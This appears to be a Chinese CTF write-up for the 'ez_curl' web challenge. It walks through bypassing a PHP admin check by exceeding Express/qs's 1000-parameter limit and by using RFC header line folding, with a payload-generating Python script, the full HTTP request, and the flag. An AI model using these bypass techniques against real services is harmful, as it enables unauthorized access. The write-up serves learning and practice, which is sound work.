# ez_curl

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=5e0d1bac-85d0-11ed-ab28-000c29bc20bf&task_category_id=3)

又是复现[wp](https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#ez-curl%F0%9F%94%97)的一天。知识点其实挺少的，只有两个，但是读题我读了半天。

```php
<?php
highlight_file(__FILE__);
$url = 'http://back-end:3000/flag?';
$input = file_get_contents('php://input');
$headers = (array)json_decode($input)->headers;
for($i = 0; $i < count($headers); $i++){
    $offset = stripos($headers[$i], ':');
    $key = substr($headers[$i], 0, $offset);
    $value = substr($headers[$i], $offset + 1);
    if(stripos($key, 'admin') > -1 && stripos($value, 'true') > -1){
        die('try hard');
    }
}
$params = (array)json_decode($input)->params;
$url .= http_build_query($params);
$url .= '&admin=false';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000);
curl_setopt($ch, CURLOPT_NOBODY, FALSE);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
```

[json_decode](https://www.w3cschool.cn/php/php-rxi22oqv.html)函数接受一个JSON格式的字符串并且把它转换为PHP变量。此处我们的输入内容借由`file_get_contents('php://input')`传入程序，查了一篇[文章](https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input)，里面说“当Content-Type为application/x-www-form-urlencoded且提交方法是POST方法时，$_POST数据与php://input数据是一致的”。看了一眼抓的包，是application/x-www-form-urlencoded，那这里就是读取post数据而已。根据for循环的逻辑，我们要在post里传headers，内容是一个数组，由`:`分割，肯定要带上admin和true。

接着看curl部分。这里完全是curl最基本的[使用](https://www.runoob.com/php/func-curl_setopt.html)，[http_build_query](https://php.golaravel.com/function.http-build-query.html)使用给出的关联（或下标）数组生成一个经过 URL-encode 的请求字符串。但是程序给我们拼接了一个`&admin=false`，说明我们要绕过这个设置，admin是什么都不能是false。

然后我有点迷茫，先上exp，最后再分析我迷茫的点。用bp给这个页面发个post，post的内容用脚本生成，抄过去就得了。

```python
data='{"headers":["admin: t",\n" true: t"],"params":{"admin":"t",'
print(data)
for i in range(2,1001):
    if i==1000:
        print(f'"{i}":"1"')
    else:
        print(f'"{i}":"1",')
print("}\n}")
```

效果如下：

```
POST / HTTP/1.1
Host: 61.147.171.105:55708
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 11949

{"headers":["admin: t",
" true: t"
],"params":{"admin":"t",
"2":"1",
"3":"1",
"4":"1",
...此处省略
"999":"1",
"1000":"1"
}
}
```

两个技巧分别是：

1. express的parameterLimit默认为1000
2. 根据rfc，header字段可以通过在每一行前面至少加一个SP或HT来扩展到多行

第一点来自源代码的[这一行](https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/dist/qs.js#L93)。结合这篇[文章](https://thunf.github.io/2017/01/20/20170120-form-keys-1000-limit/)的分析，当我们传入的参数超过1000个时，之后的参数会被舍弃掉。于是这里我们最开始发个`"admin":"t"`设置好admin的值，加上999个没用的参数，把程序拼接的`&admin=false`挤掉，即可绕过过滤。

至于headers，注意到`" true: t"`里面有个空格了吗？SP指的是空格，HT指的是制表符，根据[资料](https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2)（这篇[文章](https://blog.csdn.net/rainysia/article/details/8131174)也有提到）中的一句话：

- Header fields can be extended over multiple lines by preceding each extra line with at least one SP or HT.

不过我确实没看出扩展为多行为什么就能绕过过滤。headers不传也能绕过过滤的，而且这个文件里也没告诉我们为啥非要传这样的header，传值不是t也行，任何字母都行。为啥啊，难道就是猜吗？望有大佬告知。

## Flag
> CatCTF{23aaaab824aadf15eb19f4236f3e3b51}